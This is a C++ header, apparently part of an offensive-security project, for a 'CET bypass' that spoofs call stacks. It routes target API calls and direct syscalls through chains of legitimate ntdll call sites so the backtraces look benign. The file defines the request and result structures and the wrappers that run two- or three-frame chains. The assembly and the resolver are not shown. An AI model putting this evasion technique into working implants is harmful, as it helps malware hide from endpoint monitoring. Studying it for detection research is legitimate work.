#pragma once

// ---------------------------------------------------------------------------
// CET bypass #2 shared plumbing (x64 only).
//
// This package stays on the calling thread. No thread is created, no API is
// called and no return address is ever forged by writing memory. The whole
// spoof is driven by REAL `call` instructions inside legal ntdll call sites:
//
//   caller --CALL--> Cet2ChainEntry2 --jmp--> ntdll call site A --CALL-->
//   PE continuation --jmp--> ntdll call site B --CALL--> target API
//       target --ret--> ntdll epilogue B --ret--> ntdll epilogue A --ret-->
//       caller
//
// Each CALL pushes the same return address onto the normal stack and onto the
// CET hardware shadow stack, and each RET pops it from both. The normal stack
// backtrace and the CET backtrace therefore contain exactly the same frames
// (ntdll call-site epilogues + the caller), and CET validation always passes.
// ---------------------------------------------------------------------------

#include <Windows.h>
#include <winternl.h>

#include <cstddef>
#include <cstdint>
#include <vector>

// Implemented in bypass2/cet2_trampoline.asm (the ONLY required assembly).
// The chain never returns its own value: by the time the last epilogue RETs
// back into the caller, RAX still holds the target's return value. The entry
// points are therefore declared as returning uint64_t so the C++ side can
// read the target's RAX directly.
extern "C" std::uint64_t Cet2ChainEntry2(void* request);
extern "C" std::uint64_t Cet2ChainEntry3(void* request);
extern "C" void Cet2SyscallStub(void);

namespace cet2
{

// Layout must match cet2_trampoline.asm byte for byte.
struct Request
{
    void* CallSite1 = nullptr;  // +0x00  ntdll `call rax` site A
    void* CallSite2 = nullptr;  // +0x08  ntdll `call rax` site B
    void* CallSite3 = nullptr;  // +0x10  3-frame chain only
    void* Target = nullptr;     // +0x18  final call target
    std::uint32_t Ssn = 0;      // +0x20  syscall number (stub path)
    std::uint32_t Pad0 = 0;     // +0x24
    std::uint64_t A[12] = {};   // +0x28  A1..A12
    std::uint32_t K1 = 0;       // +0x88  epilogue fixup of CallSite1
    std::uint32_t Pad1 = 0;     // +0x8C
    std::uint32_t K2 = 0;       // +0x90  epilogue fixup of CallSite2
    std::uint32_t Pad2 = 0;     // +0x94
    std::uint32_t K3 = 0;       // +0x98  epilogue fixup of CallSite3
    std::uint32_t Pad3 = 0;     // +0x9C
};
static_assert(sizeof(Request) == 0xA0, "cet2::Request layout mismatch");

struct Result
{
    bool Ok = false;               // chain was prepared and executed
    std::uint64_t Value = 0;       // full RAX of the target when it returned
    NTSTATUS Status = 0;           // low 32 bits (NTSTATUS / EAX)
    void* CallSite1 = nullptr;     // resolved ntdll call site A
    void* CallSite2 = nullptr;     // resolved ntdll call site B
    void* CallSite3 = nullptr;     // 3-frame chain only
    void* Target = nullptr;        // final call target
    std::uint32_t K1 = 0;
    std::uint32_t K2 = 0;
    std::uint32_t K3 = 0;
};

namespace detail
{

// Resolves the ntdll call sites and fills the request. `frames` is 2 or 3.
// `args` points to up to `count` raw x64 arguments (count <= 12).
bool PrepareChain(Request& request, int frames, void* target,
                  std::uint32_t ssn, const std::uint64_t* args,
                  std::size_t count);

inline Result RunChain2(void* target, std::uint32_t ssn,
                        const std::uint64_t* args, std::size_t count)
{
    Request request;
    if (!PrepareChain(request, 2, target, ssn, args, count))
    {
        return {};
    }
    Result result;
    result.CallSite1 = request.CallSite1;
    result.CallSite2 = request.CallSite2;
    result.Target = request.Target;
    result.K1 = request.K1;
    result.K2 = request.K2;
    result.Value = Cet2ChainEntry2(&request);
    result.Status = static_cast<NTSTATUS>(static_cast<LONG>(result.Value));
    result.Ok = true;
    return result;
}

inline Result RunChain3(void* target, std::uint32_t ssn,
                        const std::uint64_t* args, std::size_t count)
{
    Request request;
    if (!PrepareChain(request, 3, target, ssn, args, count))
    {
        return {};
    }
    Result result;
    result.CallSite1 = request.CallSite1;
    result.CallSite2 = request.CallSite2;
    result.CallSite3 = request.CallSite3;
    result.Target = request.Target;
    result.K1 = request.K1;
    result.K2 = request.K2;
    result.K3 = request.K3;
    result.Value = Cet2ChainEntry3(&request);
    result.Status = static_cast<NTSTATUS>(static_cast<LONG>(result.Value));
    result.Ok = true;
    return result;
}

} // namespace detail

} // namespace cet2
